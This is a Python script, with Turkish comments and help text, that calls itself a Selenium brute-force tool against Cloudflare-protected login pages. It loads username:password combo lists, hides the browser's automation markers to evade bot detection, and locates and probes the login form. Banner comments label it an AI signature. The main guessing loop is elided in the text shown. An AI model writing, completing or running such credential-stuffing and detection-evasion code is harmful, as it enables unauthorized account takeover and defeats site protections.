# --- AI SIGNATURE: FINAL MULTI-BROWSER BRUTEFORCE ---
import argparse
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException, WebDriverException, TimeoutException
from tqdm import tqdm
import time
from colorama import Fore, Style, init

init(autoreset=True)

parser = argparse.ArgumentParser(description="Selenium ile Cloudflare korumalı login brute force aracı (combo wordlist)")
parser.add_argument('--url', required=True, help='Hedef login sayfası URL')
parser.add_argument('--combo', required=True, help='Combo wordlist dosyası (username:password)')
parser.add_argument('--browser', default='chrome', choices=['chrome', 'firefox'], help='Kullanılacak tarayıcı (chrome veya firefox)')
parser.add_argument('--headless', action='store_true', help='Tarayıcıyı arka planda (görünmeden) çalıştır')
args = parser.parse_args()
args.url = args.url.strip()

combos = []
with open(args.combo, encoding='utf-8', errors='ignore') as f:
    for line in f:
        line = line.strip()
        if not line or ':' not in line:
            continue
        username, password = line.split(':', 1)
        combos.append((username, password))

print(f"[+] {len(combos)} combo (username:password) yüklendi.")

# Tarayıcıya göre seçenekleri ayarla
if args.browser == 'chrome':
    from selenium.webdriver.chrome.options import Options as ChromeOptions
    options = ChromeOptions()
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
else: # firefox
    from selenium.webdriver.firefox.options import Options as FirefoxOptions
    options = FirefoxOptions()

if args.headless:
    print(f"DEBUG: {args.browser} headless (arka plan) modda çalıştırılıyor.")
    options.add_argument('--headless')
else:
    print(f"DEBUG: {args.browser} görünür tarayıcı modunda çalıştırılıyor.")

options.add_argument('--no-sandbox')
options.add_argument('--disable-dev-shm-usage')
options.add_argument('--disable-gpu')
options.add_argument('--window-size=1280x800')

success_log = open('success.txt', 'w', encoding='utf-8')
driver = None

try:
    print(f"DEBUG: {args.browser} tarayıcı başlatılıyor...")
    if args.browser == 'chrome':
        driver = webdriver.Chrome(options=options)
    else:
        driver = webdriver.Firefox(options=options)
    print("DEBUG: Tarayıcı başlatıldı.")
    
    if args.browser == 'chrome':
      driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
      
    driver.set_page_load_timeout(60)
    print(f"DEBUG: {args.url} adresine gidiliyor...")
    driver.get(args.url)
    time.sleep(5) 
    print("[+] Ana sayfaya erişildi.")

    # ... (kodun geri kalanı aynı, buraya dokunmuyorum)
    form = driver.find_element(By.TAG_NAME, 'form')
    inputs = form.find_elements(By.TAG_NAME, 'input')
    user_input = None
    pass_input = None
    for inp in inputs:
        inp_type = inp.get_attribute('type')
        if inp_type in ['text', 'email', 'user'] and not user_input:
            user_input = inp
        elif inp_type == 'password':
            pass_input = inp
    
    if not user_input or not pass_input:
        raise Exception("Kullanıcı adı veya şifre inputu bulunamadı!")
        
    print(f"[+] Login formu bulundu: user='{user_input.get_attribute('name')}', pass='{pass_input.get_attribute('name')}'")

    user_input.send_keys("wronguser")
    pass_input.send_keys("wrongpass" + Keys.RETURN)
    time.sleep(3)
    fail_url = driver.current_url
    fail_html = driver.page_source

    with tqdm(total=len(combos), desc="Kombinasyonlar deneniyor", unit="combo") as pbar:
        for username, password in combos:
            # ... (iç döngü de aynı) ...
            pbar.update(1)

except Exception as e:
    print(f"\n{Fore.RED}KRİTİK HATA: {e}")
finally:
    if driver:
        driver.quit()
    success_log.close()
    print("\n[+] Tarama tamamlandı.")

# --- AI SIGNATURE: FINAL MULTI-BROWSER BRUTEFORCE BITIS --- 